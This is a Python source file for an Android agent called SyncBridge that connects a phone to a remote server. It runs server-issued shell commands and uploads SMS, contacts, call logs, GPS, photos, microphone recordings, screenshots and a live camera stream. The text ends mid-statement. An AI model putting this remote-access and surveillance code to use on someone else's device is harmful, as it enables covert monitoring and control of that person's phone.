#!/usr/bin/env python3
"""
SyncBridge Android Agent v3.2
─────────────────────────────
All functions defined before main() — no forward-reference crashes.
Every thread wrapped in a supervisor — one crash never kills another.

Features:
  Core     : registration, heartbeat, remote shell, notifications
  Stats    : battery/RAM/CPU/WiFi/storage (/proc fallback, no API needed)
  Clipboard: bidirectional (termux-clipboard) or read-only fallback
  SMS      : inbox sync + send from dashboard
  Camera   : on-demand photos + MJPEG live stream
  Mic      : on-demand recording
  GPS      : continuous + on-demand fix
  Contacts : sync every 2 h
  Call log : sync every 2 min
  Screenshot: on-demand via termux-screenshot
  Control  : torch, vibrate, volume, brightness, TTS, toast, WiFi, open-url

Usage:
  python agent_android.py --server https://YOUR-TUNNEL.ms --token YOUR-TOKEN
  python agent_android.py --server "https://YOUR-TUNNEL.ms/?token=YOUR-TOKEN"
  python agent_android.py --discover
"""

import os, sys, uuid, time, json, signal, socket, platform
import subprocess, threading, argparse, glob
from urllib.parse import urlparse, parse_qs, urlunparse

try:
    import requests
except ImportError:
    print("[FATAL] 'requests' not installed.  Run: pip install requests")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
#  CLI + CONFIG
# ─────────────────────────────────────────────────────────────────────────────

def _parse_url(raw):
    if not raw: return '', None
    p   = urlparse(raw)
    tok = parse_qs(p.query).get('token', [None])[0]
    return urlunparse((p.scheme, p.netloc, p.path, '', '', '')).rstrip('/'), tok

_ap = argparse.ArgumentParser()
_ap.add_argument('--server',      default=None)
_ap.add_argument('--token',       default=None)
_ap.add_argument('--name',        default=None)
_ap.add_argument('--id',          default=None, dest='device_id')
_ap.add_argument('--discover',    action='store_true')
_ap.add_argument('--poll',        type=int, default=5)
_ap.add_argument('--gps-interval',type=int, default=30, dest='gps_interval')
_ap.add_argument('--stream-fps',  type=int, default=4,  dest='stream_fps')
_ap.add_argument('--stream-cam',  type=int, default=0,  dest='stream_cam')
args, _ = _ap.parse_known_args()

_raw_server, _url_tok = _parse_url(args.server or os.environ.get('SYNCBRIDGE_SERVER', ''))
SERVER    = _raw_server
TOKEN     = (args.token or _url_tok
             or os.environ.get('SYNCBRIDGE_TOKEN', 'syncbridge-token-2024'))
NAME      = (args.name
             or os.environ.get('SYNCBRIDGE_NAME', 'Android-' + socket.gethostname()))
DEVICE_ID = (args.device_id
             or os.environ.get('SYNCBRIDGE_ID', 'android-' + str(uuid.uuid4())[:8]))
POLL          = args.poll
GPS_INTERVAL  = args.gps_interval
STREAM_FPS    = args.stream_fps
STREAM_CAM    = args.stream_cam
STREAM_LINGER = int(os.environ.get('SYNCBRIDGE_STREAM_LINGER', 10))
CONFIG_FILE   = os.path.expanduser('~/.syncbridge_config.json')
LOG_FILE      = os.path.expanduser('~/.syncbridge.log')
running       = True

# ─────────────────────────────────────────────────────────────────────────────
#  LOGGING
# ─────────────────────────────────────────────────────────────────────────────

_log_lock = threading.Lock()

def log(msg, level='INFO'):
    ts   = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{ts}] [{level}] {msg}"
    with _log_lock:
        print(line, flush=True)
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(line + '\n')
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
#  CONFIG PERSIST
# ─────────────────────────────────────────────────────────────────────────────

def save_config():
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump({'server': SERVER, 'token': TOKEN,
                       'name': NAME, 'device_id': DEVICE_ID}, f)
    except Exception as e:
        log(f"save_config: {e}", 'WARN')

def load_config():
    global SERVER, TOKEN, NAME, DEVICE_ID
    if not os.path.exists(CONFIG_FILE): return
    try:
        c = json.load(open(CONFIG_FILE))
        SERVER    = SERVER    or c.get('server',    '')
        TOKEN     = TOKEN     or c.get('token',     TOKEN)
        NAME      = NAME      or c.get('name',      NAME)
        DEVICE_ID = DEVICE_ID or c.get('device_id', DEVICE_ID)
    except Exception as e:
        log(f"load_config: {e}", 'WARN')

# ─────────────────────────────────────────────────────────────────────────────
#  TERMUX:API DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def _check_termux_api():
    try:
        r = subprocess.run(['termux-battery-status'],
                           capture_output=True, text=True, timeout=6)
        out = r.stdout + r.stderr
        if 'termux-play-store' in out or 'not yet available' in out:
            return False
        if r.returncode == 0 and r.stdout.strip().startswith('{'):
            return True
    except Exception:
        pass
    return False

TERMUX_API = _check_termux_api()

# ─────────────────────────────────────────────────────────────────────────────
#  DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────

def discover_server_udp(timeout=5):
    log("Broadcasting UDP discovery on LAN…")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(timeout)
        sock.sendto(b'SYNCBRIDGE_DISCOVER', ('255.255.255.255', 5001))
        data, addr = sock.recvfrom(1024)
        info = json.loads(data)
        log(f"Found server at {info['url']} (UDP from {addr[0]})")
        return info.get('url'), info.get('token')
    except socket.timeout:
        log("UDP discovery timed out", 'WARN')
    except Exception as e:
        log(f"UDP discovery: {e}", 'WARN')
    return None, None

def discover_server_mdns():
    try:
        from zeroconf import ServiceBrowser, Zeroconf
        found = {}
        class Listener:
            def add_service(self, zc, type_, name):
                info = zc.get_service_info(type_, name)
                if info and info.addresses:
                    try:    ip = socket.inet_ntoa(info.addresses[0])
                    except: ip = str(info.addresses[0])
                    found['url']   = f'http://{ip}:{info.port}'
                    found['token'] = (info.properties.get(b'token') or b'').decode()
            def update_service(self, *_): pass
            def remove_service(self, *_): pass
        zc = Zeroconf()
        ServiceBrowser(zc, "_syncbridge._tcp.local.", Listener())
        time.sleep(3); zc.close()
        if found.get('url'):
            log(f"Found server via mDNS: {found['url']}")
            return found['url'], found['token']
    except ImportError: pass
    except Exception as e: log(f"mDNS: {e}", 'WARN')
    return None, None

# ─────────────────────────────────────────────────────────────────────────────
#  API + SHELL HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def api(method, path, **kw):
    headers = {'X-Auth-Token': TOKEN, 'Content-Type': 'application/json'}
    try:
        r = getattr(requests, method)(
            f"{SERVER}{path}", headers=headers, timeout=15, **kw)
        return r.json() if r.content else {}
    except requests.exceptions.ConnectionError:
        log("Connection error — is server reachable?", 'WARN'); return {}
    except Exception as e:
        log(f"API [{method.upper()} {path}]: {e}", 'WARN'); return {}

def sh(cmd, timeout=8):
    try:
        r = subprocess.run(
            cmd if isinstance(cmd, list) else cmd,
            shell=isinstance(cmd, str),
            capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired: return '', 'Timeout', -1
    except FileNotFoundError:
        cmd0 = cmd[0] if isinstance(cmd, list) else cmd.split()[0]
        return '', f'Not found: {cmd0}', -2
    except Exception as e: return '', str(e), -1

def sh_json(cmd, timeout=8):
    out, _, code = sh(cmd, timeout)
    if code == 0 and out:
        try: return json.loads(out)
        except: pass
    return None

# ─────────────────────────────────────────────────────────────────────────────
#  NO-API STAT HELPERS  (/proc and /sys — work everywhere)
# ─────────────────────────────────────────────────────────────────────────────

def _read_sys(path, default=None):
    try: return open(path).read().strip()
    except: return default

def _bat_sys():
    base = '/sys/class/power_supply'
    bat_dir = None
    for name in ['battery', 'Battery', 'BAT0', 'BAT1']:
        d = os.path.join(base, name)
        if os.path.isdir(d): bat_dir = d; break
    if not bat_dir:
        for c in glob.glob(os.path.join(base, '*')):
            if 'bat' in c.lower(): bat_dir = c; break
    if not bat_dir: return {}
    pct    = _read_sys(f'{bat_dir}/capacity', '0')
    status = _read_sys(f'{bat_dir}/status',   'Unknown')
    health = _read_sys(f'{bat_dir}/health',   'Unknown')
    temp_r = _read_sys(f'{bat_dir}/temp',     None)
    temp   = round(int(temp_r) / 10, 1) if temp_r and temp_r.lstrip('-').isdigit() else 0
    plugged = 'UNPLUGGED'
    for src in ['AC', 'USB', 'ac', 'usb']:
        if _read_sys(os.path.join(base, src, 'online')) == '1':
            plugged = src.upper(); break
    return {
        'battery_pct':    int(pct) if str(pct).isdigit() else 0,
        'battery_status': status, 'battery_health': health,
        'battery_temp':   temp,   'plugged': plugged,
    }

def _mem_proc():
    try:
        mi = {}
        for line in open('/proc/meminfo'):
            k, v = line.split(':')
            mi[k.strip()] = int(v.strip().split()[0])
        total, avail = mi.get('MemTotal', 0), mi.get('MemAvailable', 0)
        return {'mem_total_mb': total // 1024, 'mem_avail_mb': avail // 1024,
                'mem_used_pct': round((total - avail) / total * 100, 1) if total else 0}
    except: return {}

def _cpu_proc():
    try:
        parts = open('/proc/loadavg').read().split()
        return {'cpu_load_1m':  float(parts[0]),
                'cpu_load_5m':  float(parts[1]),
                'cpu_load_15m': float(parts[2])}
    except: return {}

def _storage():
    out, _, code = sh(['df', '-k', os.path.expanduser('~')])
    if code == 0 and out:
        parts = out.strip().split('\n')[-1].split()
        if len(parts) >= 4:
            try:
                return {'storage_total_mb': int(parts[1]) // 1024,
                        'storage_used_mb':  int(parts[2]) // 1024,
                        'storage_avail_mb': int(parts[3]) // 1024}
            except: pass
    return {}

def _wifi_fallback():
    stats = {}
    out, _, _ = sh('ip -4 addr show wlan0 2>/dev/null')
    for line in out.splitlines():
        if line.strip().startswith('inet '):
            stats['wifi_ip'] = line.strip().split()[1].split('/')[0]; break
    out2, _, c2 = sh('iw dev wlan0 info 2>/dev/null')
    if c2 == 0:
        for line in out2.splitlines():
            if line.strip().startswith('ssid '):
                stats['wifi_ssid'] = line.strip()[5:].strip(); break
    out3, _, c3 = sh('iw dev wlan0 link 2>/dev/null')
    if c3 == 0:
        for line in out3.splitlines():
            line = line.strip()
            if 'signal:' in line:
                try: stats['wifi_rssi'] = int(line.split('signal:')[1].split()[0])
                except: pass
            if 'tx bitrate:' in line:
                try: stats['wifi_link_speed'] = float(line.split('tx bitrate:')[1].split()[0])
                except: pass
    return stats

def _android_props():
    props = {}
    for prop, key in [
        ('ro.build.version.release', 'android_version'),
        ('ro.product.model',         'device_model'),
        ('ro.product.brand',         'device_brand'),
        ('ro.build.version.sdk',     'android_sdk'),
        ('gsm.operator.alpha',       'network_operator'),
        ('gsm.network.type',         'network_type'),
    ]:
        out, _, code = sh(['getprop', prop])
        if code == 0 and out: props[key] = out.strip()
    return props

# ─────────────────────────────────────────────────────────────────────────────
#  SUPERVISOR  — restarts any crashed thread automatically
# ─────────────────────────────────────────────────────────────────────────────

def supervised(name, fn, restart_delay=10):
    def wrapper():
        while running:
            try:
                fn()
            except Exception as e:
                import traceback
                log(f"[{name.upper()}] crashed: {e} — restarting in {restart_delay}s",
                    'ERROR')
                log(traceback.format_exc(), 'WARN')
                time.sleep(restart_delay)
    return wrapper

# ─────────────────────────────────────────────────────────────────────────────
#  HEARTBEAT & REGISTRATION
# ─────────────────────────────────────────────────────────────────────────────

def register():
    caps = ['shell', 'stats', 'gps', 'screenshot', 'control']
    if TERMUX_API:
        caps += ['clipboard', 'sms', 'camera', 'mic',
                 'contacts', 'calllog', 'notifications', 'stream']
    else:
        caps += ['clipboard_pull']
    log(f"Registering '{NAME}' "
        f"[Termux:API={'YES — F-Droid' if TERMUX_API else 'NO — Play Store'}]")
    res = api('post', '/api/register', json={
        'device_id':    DEVICE_ID, 'name': NAME, 'type': 'android',
        'os':           (f"Android/Termux{'(API)' if TERMUX_API else ''}"
                         f"/{platform.machine()}"),
        'capabilities': caps,
    })
    if res.get('status') == 'registered':
        log("Registered ✓"); save_config()
    else:
        log(f"Registration: {res}", 'WARN')

def _heartbeat():
    while running:
        try:
            bat = {}
            if TERMUX_API:
                d = sh_json(['termux-battery-status'])
                if d: bat = {'battery_pct': d.get('percentage', 0),
                             'battery_status': d.get('status', '?'),
                             'plugged': d.get('plugged', '?')}
            else:
                b = _bat_sys()
                if b: bat = {'battery_pct':    b.get('battery_pct', 0),
                             'battery_status': b.get('battery_status', '?'),
                             'plugged':        b.get('plugged', '?')}
            api('post', '/api/heartbeat',
                json={'device_id': DEVICE_ID, 'quick_stats': bat})
        except Exception as e:
            log(f"[HEARTBEAT] {e}", 'WARN')
        time.sleep(20)

# ─────────────────────────────────────────────────────────────────────────────
#  STATS
# ─────────────────────────────────────────────────────────────────────────────

def _stats():
    while running:
        try:
            stats = {'device_id': DEVICE_ID}
            if TERMUX_API:
                bat  = sh_json(['termux-battery-status'])
                if bat: stats.update({'battery_pct':    bat.get('percentage', 0),
                                      'battery_status': bat.get('status', ''),
                                      'battery_health': bat.get('health', ''),
                                      'battery_temp':   bat.get('temperature', 0),
                                      'plugged':        bat.get('plugged', '')})
                tel  = sh_json(['termux-telephony-deviceinfo'])
                if tel: stats.update({'network_operator': tel.get('network_operator_name', ''),
                                      'network_type':     tel.get('data_network_type', ''),
                                      'sim_state':        tel.get('sim_state', '')})
                wifi = sh_json(['termux-wifi-connectioninfo'])
                if wifi: stats.update({'wifi_ssid':       wifi.get('ssid', ''),
                                       'wifi_rssi':       wifi.get('rssi', 0),
                                       'wifi_ip':         wifi.get('ip', ''),
                                       'wifi_link_speed': wifi.get('link_speed_mbps', 0)})
            else:
                stats.update(_bat_sys())
                stats.update(_wifi_fallback())
                stats.update(_android_props())
            stats.update(_mem_proc())
            stats.update(_cpu_proc())
            stats.update(_storage())
            try: stats['cpu_cores'] = len(
                [l for l in open('/proc/cpuinfo') if l.startswith('processor')])
            except: pass
            try: stats['uptime_hours'] = round(
                float(open('/proc/uptime').read().split()[0]) / 3600, 1)
            except: pass
            api('post', '/api/android/stats', json=stats)
            log(f"[STATS] bat={stats.get('battery_pct','?')}%  "
                f"mem={stats.get('mem_used_pct','?')}%  "
                f"wifi={stats.get('wifi_ssid','?')}  "
                f"ip={stats.get('wifi_ip','?')}")
        except Exception as e:
            log(f"[STATS] {e}", 'WARN')
        time.sleep(30)

# ─────────────────────────────────────────────────────────────────────────────
#  CLIPBOARD
# ─────────────────────────────────────────────────────────────────────────────

_last_clip = ''

def _clipboard():
    global _last_clip
    while running:
        try:
            if TERMUX_API:
                cur, _, code = sh(['termux-clipboard-get'])
                if code == 0 and cur and cur != _last_clip:
                    _last_clip = cur
                    api('post', '/api/clipboard', json={'content': cur, 'source': NAME})
                    log(f"[CLIP] → {cur[:60]}")
            remote = api('get', '/api/clipboard')
            if (remote and remote.get('content')
                    and remote.get('source') != NAME
                    and remote['content'] != _last_clip):
                content = remote['content']
                if TERMUX_API:
                    sh(['termux-clipboard-set', content])
                    log(f"[CLIP] ← set: {content[:60]}")
                else:
                    log(f"[CLIP] ← (read-only): {content[:60]}")
                _last_clip = content
        except Exception as e:
            log(f"[CLIP] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  SMS
# ─────────────────────────────────────────────────────────────────────────────

def _sms():
    if not TERMUX_API:
        log("[SMS] Termux:API unavailable — SMS disabled", 'WARN')
        while running:
            try:
                p = api('get', f'/api/sms/poll?device_id={DEVICE_ID}')
                if isinstance(p, list) and p:
                    api('post', '/api/notifications',
                        json={'title': 'SMS unavailable',
                              'body': 'Install F-Droid Termux:API',
                              'app': 'SyncBridge', 'icon': '⚠', 'source': NAME})
            except: pass
            time.sleep(30)
        return
    while running:
        try:
            out, _, code = sh(['termux-sms-list', '-l', '50', '-t', 'inbox'], timeout=15)
            if code == 0 and out:
                try:
                    msgs = json.loads(out)
                    if isinstance(msgs, list):
                        api('post', '/api/sms/inbox',
                            json={'device_id': DEVICE_ID, 'messages': msgs})
                        log(f"[SMS] synced {len(msgs)} messages")
                except: pass
            pending = api('get', f'/api/sms/poll?device_id={DEVICE_ID}')
            if isinstance(pending, list):
                for sms in pending:
                    to, body = sms.get('to', ''), sms.get('body', '')
                    log(f"[SMS] → {to}: {body[:40]}")
                    _, err, code = sh(['termux-sms-send', '-n', to, body], timeout=20)
                    ok = code == 0
                    api('post', '/api/notifications',
                        json={'title': 'SMS Sent' if ok else 'SMS Failed',
                              'body': f"To {to}: {body[:60]}" if ok else err,
                              'app': 'SyncBridge', 'icon': '✅' if ok else '❌',
                              'source': NAME})
        except Exception as e:
            log(f"[SMS] {e}", 'WARN')
        time.sleep(15)

# ─────────────────────────────────────────────────────────────────────────────
#  CAMERA  (single photos)
# ─────────────────────────────────────────────────────────────────────────────

def _camera():
    if not TERMUX_API:
        log("[CAM] Termux:API unavailable — camera disabled", 'WARN')
        while running:
            try:
                c = api('get', f'/api/camera/poll?device_id={DEVICE_ID}')
                if isinstance(c, list) and c:
                    api('post', '/api/notifications',
                        json={'title': 'Camera unavailable',
                              'body': 'Install F-Droid Termux:API',
                              'app': 'SyncBridge', 'icon': '⚠', 'source': NAME})
            except: pass
            time.sleep(POLL)
        return
    while running:
        try:
            cmds = api('get', f'/api/camera/poll?device_id={DEVICE_ID}')
            if isinstance(cmds, list):
                for cmd in cmds:
                    rid, cam = cmd.get('id', ''), cmd.get('camera', 0)
                    path = os.path.expanduser(f'~/.sb_photo_{rid}.jpg')
                    log(f"[CAM] capturing cam{cam}…")
                    _, err, code = sh(
                        ['termux-camera-photo', '-c', str(cam), path], timeout=15)
                    if code == 0 and os.path.exists(path):
                        with open(path, 'rb') as ph:
                            r = requests.post(
                                f"{SERVER}/api/camera/upload",
                                headers={'X-Auth-Token': TOKEN},
                                files={'photo': ('photo.jpg', ph, 'image/jpeg')},
                                data={'device_id': DEVICE_ID, 'request_id': rid})
                        try: os.remove(path)
                        except: pass
                        log(f"[CAM] {'OK' if r.status_code == 200 else 'FAIL'}")
                    else:
                        log(f"[CAM] capture failed: {err}", 'WARN')
                        api('post', '/api/notifications',
                            json={'title': 'Camera Error', 'body': err or 'Unknown',
                                  'app': 'SyncBridge', 'icon': '📷', 'source': NAME})
        except Exception as e:
            log(f"[CAM] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  MICROPHONE
# ─────────────────────────────────────────────────────────────────────────────

def _mic():
    if not TERMUX_API:
        log("[MIC] Termux:API unavailable — mic disabled", 'WARN')
        while running:
            try:
                c = api('get', f'/api/mic/poll?device_id={DEVICE_ID}')
                if isinstance(c, list) and c:
                    api('post', '/api/notifications',
                        json={'title': 'Mic unavailable',
                              'body': 'Install F-Droid Termux:API',
                              'app': 'SyncBridge', 'icon': '⚠', 'source': NAME})
            except: pass
            time.sleep(POLL)
        return
    while running:
        try:
            cmds = api('get', f'/api/mic/poll?device_id={DEVICE_ID}')
            if isinstance(cmds, list):
                for cmd in cmds:
                    rid, dur = cmd.get('id', ''), cmd.get('duration', 10)
                    path = os.path.expanduser(f'~/.sb_rec_{rid}.m4a')
                    log(f"[MIC] recording {dur}s…")
                    sh(['termux-microphone-record', '-l', str(dur), '-f', path],
                       timeout=dur + 10)
                    for _ in range(dur + 6):
                        s, _, _ = sh(['termux-microphone-record', '-q'])
                        if 'false' in s.lower(): break
                        time.sleep(1)
                    if os.path.exists(path):
                        with open(path, 'rb') as rc:
                            r = requests.post(
                                f"{SERVER}/api/mic/upload",
                                headers={'X-Auth-Token': TOKEN},
                                files={'recording': ('rec.m4a', rc, 'audio/mp4')},
                                data={'device_id': DEVICE_ID, 'request_id': rid})
                        try: os.remove(path)
                        except: pass
                        log(f"[MIC] {'OK' if r.status_code == 200 else 'FAIL'}")
                    else:
                        log("[MIC] recording file missing", 'WARN')
        except Exception as e:
            log(f"[MIC] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  REMOTE SHELL
# ─────────────────────────────────────────────────────────────────────────────

def _shell():
    while running:
        try:
            cmds = api('get', f'/api/shell/poll?device_id={DEVICE_ID}')
            if isinstance(cmds, list):
                for c in cmds:
                    rid, command = c['id'], c['command']
                    log(f"[SHELL] exec: {command}")
                    try:
                        res = subprocess.run(
                            command, shell=True, capture_output=True,
                            text=True, timeout=30)
                        api('post', '/api/shell/result',
                            json={'request_id': rid, 'output': res.stdout,
                                  'error': res.stderr, 'exit_code': res.returncode,
                                  'device': NAME})
                    except subprocess.TimeoutExpired:
                        api('post', '/api/shell/result',
                            json={'request_id': rid, 'output': '',
                                  'error': 'Timeout (30s)', 'exit_code': -1,
                                  'device': NAME})
        except Exception as e:
            log(f"[SHELL] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  NOTIFICATIONS
# ─────────────────────────────────────────────────────────────────────────────

def _notifications():
    seen = set()
    while running:
        try:
            notifs = api('get', '/api/notifications')
            if isinstance(notifs, list):
                for n in notifs:
                    if n['id'] not in seen:
                        seen.add(n['id'])
                        if n.get('source') != NAME:
                            title = (f"{n.get('app')} — {n.get('title','')}"
                                     if n.get('app') else n.get('title', ''))
                            body = n.get('body', '')
                            if TERMUX_API:
                                sh(['termux-notification',
                                    '--title', title, '--content', body])
                            log(f"[NOTIF] {title}: {body[:60]}")
        except Exception as e:
            log(f"[NOTIF] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  GPS
# ─────────────────────────────────────────────────────────────────────────────

def _gps():
    if not TERMUX_API:
        log("[GPS] Termux:API unavailable — GPS disabled", 'WARN')
        while running:
            try: api('get', f'/api/gps/poll?device_id={DEVICE_ID}')
            except: pass
            time.sleep(30)
        return

    def get_fix():
        f = sh_json(['termux-location', '-p', 'gps', '-r', 'once'], timeout=30)
        if not f:
            f = sh_json(['termux-location', '-p', 'network', '-r', 'once'],
                        timeout=15)
        return f

    log(f"[GPS] started — interval={GPS_INTERVAL}s")
    while running:
        try:
            triggers = api('get', f'/api/gps/poll?device_id={DEVICE_ID}')
            if isinstance(triggers, list) and triggers:
                log(f"[GPS] {len(triggers)} on-demand trigger(s)")
                fix = get_fix()
                if fix:
                    fix.update({'device_id': DEVICE_ID, 'mode': 'triggered'})
                    api('post', '/api/gps/update', json=fix)
                    log(f"[GPS] triggered: "
                        f"lat={fix.get('latitude',0):.5f} "
                        f"lon={fix.get('longitude',0):.5f}")
                else:
                    log("[GPS] no fix", 'WARN')

            fix = get_fix()
            if fix:
                fix.update({'device_id': DEVICE_ID, 'mode': 'continuous'})
                api('post', '/api/gps/update', json=fix)
                log(f"[GPS] lat={fix.get('latitude',0):.5f}  "
                    f"lon={fix.get('longitude',0):.5f}  "
                    f"acc={fix.get('accuracy','?')}m")
        except Exception as e:
            log(f"[GPS] {e}", 'WARN')
        time.sleep(GPS_INTERVAL)

# ─────────────────────────────────────────────────────────────────────────────
#  CONTACTS
# ─────────────────────────────────────────────────────────────────────────────

def _contacts():
    if not TERMUX_API:
        log("[CONTACTS] Termux:API unavailable — contacts disabled", 'WARN')
        return
    while running:
        try:
            out, _, code = sh(['termux-contact-list'], timeout=20)
            if code == 0 and out:
                try:
                    contacts = json.loads(out)
                    if isinstance(contacts, list):
                        api('post', '/api/contacts/sync',
                            json={'device_id': DEVICE_ID, 'contacts': contacts})
                        log(f"[CONTACTS] synced {len(contacts)}")
                except json.JSONDecodeError as e:
                    log(f"[CONTACTS] JSON: {e}", 'WARN')
            else:
                log(f"[CONTACTS] failed (code {code})", 'WARN')
        except Exception as e:
            log(f"[CONTACTS] {e}", 'WARN')
        time.sleep(7200)

# ─────────────────────────────────────────────────────────────────────────────
#  CALL LOG
# ─────────────────────────────────────────────────────────────────────────────

def _calllog():
    if not TERMUX_API:
        log("[CALLLOG] Termux:API unavailable — call log disabled", 'WARN')
        return
    while running:
        try:
            out, _, code = sh(['termux-call-log', '-l', '100'], timeout=15)
            if code == 0 and out:
                try:
                    calls = json.loads(out)
                    if isinstance(calls, list):
                        api('post', '/api/calllog/sync',
                            json={'device_id': DEVICE_ID, 'calls': calls})
                        log(f"[CALLLOG] synced {len(calls)}")
                except: pass
        except Exception as e:
            log(f"[CALLLOG] {e}", 'WARN')
        time.sleep(120)

# ─────────────────────────────────────────────────────────────────────────────
#  SCREENSHOT
# ─────────────────────────────────────────────────────────────────────────────

def _screenshot():
    if not TERMUX_API:
        log("[SS] Termux:API unavailable — screenshot disabled", 'WARN')
        while running:
            try:
                c = api('get', f'/api/screenshot/poll?device_id={DEVICE_ID}')
                if isinstance(c, list) and c:
                    api('post', '/api/notifications',
                        json={'title': 'Screenshot unavailable',
                              'body': 'Install F-Droid Termux:API',
                              'app': 'SyncBridge', 'icon': '⚠', 'source': NAME})
            except: pass
            time.sleep(POLL)
        return
    while running:
        try:
            cmds = api('get', f'/api/screenshot/poll?device_id={DEVICE_ID}')
            if isinstance(cmds, list):
                for cmd in cmds:
                    rid  = cmd.get('id', '')
                    path = os.path.expanduser(f'~/.sb_ss_{rid}.png')
                    log("[SS] capturing…")
                    _, err, code = sh(['termux-screenshot', '-f', path], timeout=15)
                    if code != 0 or not os.path.exists(path):
                        sh(f'termux-screenshot > "{path}"', timeout=15)
                    if os.path.exists(path) and os.path.getsize(path) > 0:
                        with open(path, 'rb') as ss:
                            r = requests.post(
                                f"{SERVER}/api/screenshot/upload",
                                headers={'X-Auth-Token': TOKEN},
                                files={'screenshot': ('ss.png', ss, 'image/png')},
                                data={'device_id': DEVICE_ID, 'request_id': rid})
                        try: os.remove(path)
                        except: pass
                        log(f"[SS] {'OK' if r.status_code == 200 else 'FAIL'}")
                    else:
                        log(f"[SS] failed: {err}", 'WARN')
                        api('post', '/api/notifications',
                            json={'title': 'Screenshot failed', 'body': err or '?',
                                  'app': 'SyncBridge', 'icon': '📱', 'source': NAME})
        except Exception as e:
            log(f"[SS] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  DEVICE CONTROL
# ─────────────────────────────────────────────────────────────────────────────

def _run(args, timeout=8):
    out, err, code = sh(args, timeout=timeout)
    return code == 0, out, err

def _ctrl_exec(cmd, params):
    if cmd == 'torch_on':
        if TERMUX_API: return _run(['termux-torch', '--on'])
        return False, '', 'Requires Termux:API'
    if cmd == 'torch_off':
        if TERMUX_API: return _run(['termux-torch', '--off'])
        return False, '', 'Requires Termux:API'
    if cmd == 'vibrate':
        dur = int(params.get('duration', 500))
        if TERMUX_API: return _run(['termux-vibrate', '-d', str(dur)])
        return False, '', 'Requires Termux:API'
    if cmd == 'volume':
        stream, level = params.get('stream', 'music'), int(params.get('level', 8))
        if TERMUX_API: return _run(['termux-volume', stream, str(level)])
        return _run(['amixer', 'set', 'Master', f'{level}%'])
    if cmd == 'brightness':
        val = int(params.get('value', 128))
        if TERMUX_API: return _run(['termux-brightness', str(val)])
        try:
            bl = glob.glob('/sys/class/backlight/*/brightness')
            if bl:
                max_b = int(open(bl[0].replace('brightness','max_brightness')).read())
                open(bl[0],'w').write(str(int(val / 255 * max_b)))
                return True, '', ''
        except Exception as e:
            return False, '', str(e)
        return False, '', 'No backlight sysfs'
    if cmd == 'tts':
        text = params.get('text', '')
        if TERMUX_API: return _run(['termux-tts-speak', text], timeout=30)
        ok, o, e = _run(['espeak', text])
        return (ok, o, e) if ok else _run(['festival', '--tts'], timeout=15)
    if cmd == 'toast':
        text = params.get('text', '')
        if TERMUX_API: return _run(['termux-toast', text])
        log(f"[CTRL] toast: {text}"); return True, '', ''
    if cmd == 'open_url':
        url = params.get('url', '')
        if TERMUX_API: return _run(['termux-open-url', url])
        return _run(['am','start','-a','android.intent.action.VIEW','-d', url])
    if cmd == 'wifi_on':  return _run(['svc', 'wifi', 'enable'])
    if cmd == 'wifi_off': return _run(['svc', 'wifi', 'disable'])
    if cmd == 'airplane_on':
        return _run(['settings','put','global','airplane_mode_on','1'])
    if cmd == 'airplane_off':
        return _run(['settings','put','global','airplane_mode_on','0'])
    return False, '', f"Unknown command: {cmd}"

def _control():
    while running:
        try:
            cmds = api('get', f'/api/control/poll?device_id={DEVICE_ID}')
            if isinstance(cmds, list):
                for item in cmds:
                    rid     = item.get('id', '')
                    command = item.get('command', '')
                    params  = {k: v for k, v in item.items()
                               if k not in ('id', 'ts', 'command')}
                    log(f"[CTRL] {command} {params}")
                    try:
                        success, output, error = _ctrl_exec(command, params)
                    except Exception as e:
                        success, output, error = False, '', str(e)
                    log(f"[CTRL] → {'OK' if success else 'FAIL: ' + error[:60]}")
                    api('post', '/api/control/result',
                        json={'request_id': rid, 'output': output,
                              'error': error, 'success': success, 'device': NAME})
        except Exception as e:
            log(f"[CTRL] {e}", 'WARN')
        time.sleep(POLL)

# ─────────────────────────────────────────────────────────────────────────────
#  MJPEG LIVE STREAM
# ─────────────────────────────────────────────────────────────────────────────

def _capture_jpeg(cam_idx=0):
    path = os.path.expanduser(f'~/.sb_stream_{cam_idx}.jpg')
    if TERMUX_API:
        _, _, code = sh(
            ['termux-camera-photo', '-c', str(cam_idx), path], timeout=8)
        if code == 0 and os.path.exists(path):
            try:
                data = open(path, 'rb').read()
                if len(data) > 100 and data[:2] == b'\xff\xd8':
                    return data
            except: pass
    dev = f'/dev/video{cam_idx}'
    if os.path.exists(dev):
        _, _, code = sh(
            ['ffmpeg', '-y', '-f', 'v4l2', '-i', dev,
             '-frames:v', '1', '-q:v', '5', path], timeout=6)
        if code == 0 and os.path.exists(path):
            try:
                data = open(path, 'rb').read()
                if len(data) > 100 and data[:2] == b'\xff\xd8':
                    return data
            except: pass
    return None

def _stream():
    if not TERMUX_API:
        log("[STREAM] Termux:API unavailable — live stream disabled", 'WARN')
        return

    log(f"[STREAM] started — max {STREAM_FPS} FPS  cam {STREAM_CAM}  "
        f"linger {STREAM_LINGER}s")
    streaming    = False
    linger_until = 0
    cam          = STREAM_CAM
    target_fps   = STREAM_FPS

    while running:
        try:
            status  = api('get', f'/api/stream/{DEVICE_ID}/status')
            active  = status.get('active', False)
            viewers = status.get('viewers', 0)
            cam        = int(status.get('camera', cam))
            target_fps = max(1, min(15, int(status.get('fps', target_fps))))

            if active and viewers > 0:
                if not streaming:
                    log(f"[STREAM] starting — {viewers} viewer(s)  "
